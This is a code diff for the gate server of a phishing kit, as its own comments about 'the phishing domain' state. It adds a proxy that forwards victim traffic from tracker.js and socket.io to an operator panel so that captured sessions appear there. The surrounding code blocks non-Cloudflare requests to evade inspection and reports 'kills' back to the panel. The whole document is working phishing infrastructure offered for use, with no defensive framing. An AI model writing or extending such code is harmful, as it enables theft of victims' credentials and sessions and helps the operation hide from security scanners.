@@ -360,6 +360,41 @@ function buildChallengeHtml(targetUrl, tok) {
 </body></html>`;
 }
 
+// ─── Proxy to panel server ────────────────────────────────────────────────────
+// /api/* and /socket.io/* must reach the panel, not the VPS docroot.
+function proxyToPanel(req, res) {
+  if (!PANEL_URL) {
+    res.writeHead(502, { 'Content-Type': 'text/plain' });
+    return res.end('Bad Gateway: no panel URL configured');
+  }
+  let panelU;
+  try { panelU = new URL(PANEL_URL); } catch {
+    res.writeHead(502, { 'Content-Type': 'text/plain' });
+    return res.end('Bad Gateway: invalid panel URL');
+  }
+  const isHttps = panelU.protocol === 'https:';
+  const port = panelU.port ? parseInt(panelU.port, 10) : (isHttps ? 443 : 80);
+  const headers = Object.assign({}, req.headers, { host: panelU.host });
+
+  const opts = {
+    hostname: panelU.hostname,
+    port,
+    path: req.url,
+    method: req.method,
+    headers,
+  };
+
+  const client = isHttps ? require('https') : http;
+  const proxy = client.request(opts, (panelRes) => {
+    res.writeHead(panelRes.statusCode, panelRes.headers);
+    panelRes.pipe(res, { end: true });
+  });
+  proxy.on('error', () => {
+    try { res.writeHead(502); res.end('Bad Gateway'); } catch {}
+  });
+  req.pipe(proxy, { end: true });
+}
+
 // ─── Optional telemetry to panel ─────────────────────────────────────────────
 function reportKill(reason, req) {
   if (!PANEL_URL) return Promise.resolve();
@@ -403,6 +438,14 @@ function handle(req, res) {
   if (p === '/__alp_health') {
     res.writeHead(200, { 'Content-Type': 'application/json' });
     return res.end(JSON.stringify({ ok: true, slug: SLUG, uptime: process.uptime() }));
+  }
+
+  // Panel API + socket.io — proxy directly to panel server, bypass all gate logic.
+  // The browser's tracker.js POSTs /api/tracker/* and connects socket.io relative to
+  // the phishing domain; without this they'd hit the VPS docroot and get 404s, so no
+  // sessions would ever appear in the panel.
+  if (p.startsWith('/api/') || p.startsWith('/socket.io/')) {
+    return proxyToPanel(req, res);
   }
 
   // 0. Block non-Cloudflare traffic — if cf-ray is missing, the request
